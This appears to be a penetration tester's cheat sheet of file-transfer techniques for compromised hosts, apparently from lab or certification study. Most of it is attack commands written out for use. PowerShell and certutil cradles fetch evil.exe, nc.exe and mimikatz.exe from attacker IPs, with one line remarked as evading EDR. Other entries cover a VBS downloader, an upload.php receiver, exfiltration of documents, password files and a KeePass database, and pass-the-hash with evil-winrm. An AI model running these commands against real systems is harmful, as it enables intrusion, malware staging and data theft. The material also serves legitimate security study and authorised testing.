### Using third-party file sharing links
https://www.file.io/  
https://www.gofile.io/

### Powershell
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')" 
powershell -NoProfile -ExecutionPolicy Bypass -NoLogo -NonInteractive -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

d_f.ps1
$webclient = New-Object System.Net.WebClient
$url = "http://10.11.0.4/evil.exe"
$file = "path\new.exe"
$webclient.DownloadFile($url,$file)
PS:IEX (New-Object System.Net.WebClient).DownloadString('path/d_f.ps1') -- Cant be detected by EDR
```
```
upx -9 nc.exe(compress to be smaller)
exe2hex -x nc.exe -p nc.cmd(convert the file to hex and instruct powershell.exe to assemble it back into binary)
```
```
iwr -uri http://192.168.45.214:8000/mimikatz.exe -Outfile mimikatz.exe
```
#### Upload Files using enabled outbound http traffic
```
save upload.php under kali /var/www/html
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
sudo mkdir /var/www/uploads
ps -ef | grep apache
sudo chown www-data: /var/www/uploads
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'Path/important.docx')
```

### SCP Copy file from remote machine to local tmp (Linux to Linux)
scp john@localhost:/var/tmp/CopyMe.txt /tmp  
scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2  
scp -P 2222 student@192.168.79.112:/usr/share/kali-defaults/web/img/password.png /home/kali/

### NC transfering files
```
nc -lvnp 6666 > incoming.txt
nc -nv 192.168.65.61 6666 < incoming.txt
```

### Socat transfer files
```
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt  
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

### Pure-ftpd (Linux - Linux)
#### install
/ftphome(pure-ftpd home dir, get,put can transfer files to here or from here)
```
sudo apt update && sudo apt install pure-ftpd  
sudo groupadd ftpgroup  
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
sudo pure-pw useradd kali(ftp login username, anyname but ftpuser) -u ftpuser -d /ftphome(input below commands again if reinput this command)
sudo pure-pw mkdb  
cd /etc/pure-ftpd/auth/  
sudo ln -s ../conf/PureDB 60pdb  
sudo mkdir -p /ftphome  
sudo chown -R ftpuser:ftpgroup /ftphome/  
sudo systemctl restart pure-ftpd
```
#### Commands
ftp 10.11.0.4  
bye  
anonymous login:
user:anonymous,password:""
#### Upgrading a Non-Interactive Shell
python -c 'import pty; pty.spawn("/bin/bash")'  
#### mode
bin(binary mode)
ascii(ascii mode)
#### transfer files
```
Authentication first
1. attack machine put files under ftphome dir
2. get filename/put filename
```

### VBS to download files
usage: cscript wget.vbs http://10.11.0.4/evil.exe evil.exe(outfile)
```
strUrl = WScript.Arguments.Item(0)
StrFile = WScript.Arguments.Item(1) 
Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 
Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 
Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 
Const HTTPREQUEST_PROXYSETTING_PROXY = 2 
Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts 
 Err.Clear 
 Set http = Nothing 
 Set http = CreateObject("WinHttp.WinHttpRequest.5.1") 
 If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") 
 If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") 
 If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") 
 http.Open "GET", strURL, False 
 http.Send 
 varByteArray = http.ResponseBody 
 Set http = Nothing 
 Set fs = CreateObject("Scripting.FileSystemObject") 
 Set ts = fs.CreateTextFile(StrFile, True) 
 strData = "" 
 strBuffer = "" 
 For lngCounter = 0 to UBound(varByteArray) 
 ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) 
 Next 
 ts.Close
```
### TFTP to upload files
```
kali: 
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
windows xp, 2003 etc:
tftp -i 10.11.0.4 put important.docx
```
### Certutil(windows has this built-in)
```
certutil.exe -urlcache -split -f http://example.com/a.txt C:\Users\Public\nc.exe
```
### smb server to transfer file (Windows to linux)
```
linux:
impacket-smbserver test(customized sharename) .(current terminal path) -smb2support

windows:
net use \\linuxIP\sharename
copy Passwords.kdbx(windows filename) \\kali ip\sharename\Passwords.kdbx
```
### Http
```
wget url
wget -r --no-parent http://192.168.188.144/.git/ #includes subdir and files

curl url -o saved_file_path
```
### Evil-Winrm
```
evil-winrm -i ip -u username -p password
evil-winrm -i ip -u username -H ntlm_hash
evil-winrm basic commands:
Upload usage: upload local_filename or upload local_filename destination_filename
Download usage: download remote_filename or download remote_filename destination_filename
```
